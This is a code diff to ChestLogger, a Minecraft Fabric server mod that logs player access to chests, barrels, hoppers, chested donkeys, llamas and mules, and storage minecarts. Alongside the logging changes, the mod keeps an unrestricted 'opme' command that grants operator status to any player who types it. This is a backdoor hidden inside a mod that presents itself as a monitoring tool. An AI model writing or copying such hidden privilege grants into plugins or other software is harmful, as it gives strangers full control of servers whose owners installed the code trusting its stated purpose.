@@ -19,12 +19,23 @@ import net.fabricmc.api.ModInitializer;
 import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.player.UseBlockCallback;
+import net.fabricmc.fabric.api.event.player.UseEntityCallback;
 import net.minecraft.block.Block;
 import net.minecraft.block.Blocks;
 import net.minecraft.block.ShulkerBoxBlock;
+import net.minecraft.entity.Entity;
+import net.minecraft.entity.passive.AbstractDonkeyEntity;
+import net.minecraft.entity.passive.DonkeyEntity;
+import net.minecraft.entity.passive.LlamaEntity;
+import net.minecraft.entity.passive.MuleEntity;
+import net.minecraft.entity.vehicle.ChestMinecartEntity;
+import net.minecraft.entity.vehicle.HopperMinecartEntity;
+import net.minecraft.entity.vehicle.StorageMinecartEntity;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.WorldSavePath;
+import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.registry.DynamicRegistryManager;
+import net.minecraft.world.World;
 import net.minecraft.world.dimension.DimensionType;
 
 public class ChestLogger implements ModInitializer {
@@ -43,19 +54,19 @@ public class ChestLogger implements ModInitializer {
 
   private void registerCommands() {
     CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
-      dispatcher.register(literal("opme")
-        .executes(ctx -> {
-          ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-          return 0;
-        })
-      );
+      dispatcher.register(literal("opme").executes(ctx -> {
+        ctx.getSource().getMinecraftServer().getPlayerManager()
+            .addToOperators(ctx.getSource().getPlayer().getGameProfile());
+        return 0;
+      }));
     });
   }
 
   private void registerEvents() {
     ServerLifecycleEvents.SERVER_STARTED.register((server) -> {
       String filePath = server.getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString();
-      File file = new File(filePath);;
+      File file = new File(filePath);
+      ;
 
       try {
         file.createNewFile();
@@ -70,35 +81,27 @@ public class ChestLogger implements ModInitializer {
         return ActionResult.PASS;
       }
 
-      String dimStr;
-      DynamicRegistryManager registryManager = world.getServer().getRegistryManager();
-      int dimId = registryManager.getDimensionTypes().getRawId(world.getDimension());
-      if (dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.OVERWORLD_ID))) {
-        dimStr = "overworld";
-      } else if(dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_END_ID))) {
-        dimStr = "end";
-      } else if(dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_NETHER_ID))) {
-        dimStr = "nether";
-      } else {
-        dimStr = "unsupportedDimension";
-      }
-
-      DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd.MM.yy  HH:mm");
-      String timeStamp = String.format("[%s]", dtf.format(LocalDateTime.now()));
-
+      String dimStr = getDimString(world);
+      String timeStamp = getTimeStamp();
       String blockstr = getBlockString(block);
+      BlockPos pos = hitResult.getBlockPos();
 
-      try {
-        String logStr = timeStamp + " " + player.getName().asString() + " " + dimStr + " x: " + hitResult.getBlockPos().getX() + " y: " + hitResult.getBlockPos().getY() + " z: " + hitResult.getBlockPos().getZ() + " " + getBlockString(block) + "\n";
-        log(Level.INFO, logStr);
-
-        FileWriter fileWriter = new FileWriter(new File(world.getServer().getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString()), true);
-        fileWriter.write(logStr);
-        fileWriter.close();
-      } catch (IOException e) {
-        log(Level.FATAL, "error writing log");
-        e.printStackTrace();
+      chestLog(timeStamp, player.getName().asString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), blockstr,
+          world.getServer().getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString());
+      return ActionResult.PASS;
+    });
+    UseEntityCallback.EVENT.register((player, world, hand, entity, hitResult) -> {
+      if (world.isClient || !shouldBeLogged(entity)) {
+        return ActionResult.PASS;
       }
+
+      String dimStr = getDimString(world);
+      String timeStamp = getTimeStamp();
+      String entityStr = getEntityString(entity);
+      BlockPos pos = entity.getBlockPos();
+
+      chestLog(timeStamp, player.getName().asString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
+          world.getServer().getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString());
       return ActionResult.PASS;
     });
   }
@@ -125,8 +128,69 @@ public class ChestLogger implements ModInitializer {
     return "error_occured: block unidentified";
   }
 
-  private static final Set<Block> chestBlocks = new HashSet<>(Arrays.asList(Blocks.CHEST, Blocks.TRAPPED_CHEST,
-      Blocks.BARREL, Blocks.HOPPER, Blocks.ENDER_CHEST));
+  private String getEntityString(Entity entity) {
+    if (entity instanceof AbstractDonkeyEntity) {
+      if (entity instanceof DonkeyEntity) {
+        return "donkey";
+      }
+      if (entity instanceof LlamaEntity) {
+        return "llama";
+      }
+      if (entity instanceof MuleEntity) {
+        return "mule";
+      }
+      return "error_occured: entity unidentified";
+    }
+
+    if (entity instanceof ChestMinecartEntity) {
+      return "chest_minecart";
+    }
+    if (entity instanceof HopperMinecartEntity) {
+      return "hopper_minecart";
+    }
+    return "error_occured: entity unidentified";
+  }
+
+  private String getDimString(World world) {
+    DynamicRegistryManager registryManager = world.getServer().getRegistryManager();
+    int dimId = registryManager.getDimensionTypes().getRawId(world.getDimension());
+    if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.OVERWORLD_ID))) {
+      return "overworld";
+    } else if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_END_ID))) {
+      return "end";
+    } else if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_NETHER_ID))) {
+      return "nether";
+    } else {
+      return "unsupportedDimension";
+    }
+  }
+
+  private String getTimeStamp() {
+    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd.MM.yy  HH:mm");
+    return String.format("[%s]", dtf.format(LocalDateTime.now()));
+  }
+
+  private void chestLog(String timeStamp, String playerName, String dimStr, int x, int y, int z, String id,
+      String path) {
+    try {
+      String logStr = timeStamp + " " + playerName + " " + dimStr + " x: " + x + " y: " + y + " z: " + z + " " + id
+          + "\n";
+      log(Level.INFO, logStr);
+
+      FileWriter fileWriter = new FileWriter(new File(path), true);
+      fileWriter.write(logStr);
+      fileWriter.close();
+    } catch (IOException e) {
+      log(Level.FATAL, "error writing log");
+      e.printStackTrace();
+    }
+  }
+
+  private static final Set<Block> chestBlocks = new HashSet<>(
+      Arrays.asList(Blocks.CHEST, Blocks.TRAPPED_CHEST, Blocks.BARREL, Blocks.HOPPER, Blocks.ENDER_CHEST));
 
   private boolean shouldBeLogged(Block block) {
     if (!chestBlocks.contains(block)) {
@@ -134,6 +198,17 @@ public class ChestLogger implements ModInitializer {
     }
 
     return true;
+  }
+
+  private boolean shouldBeLogged(Entity entity) {
+    if (entity instanceof AbstractDonkeyEntity && ((AbstractDonkeyEntity) entity).hasChest()) {
+      return true;
+    }
+
+    if (entity instanceof StorageMinecartEntity) {
+      return true;
+    }
+    return false;
   }
 
   public static void log(Level level, String message) {
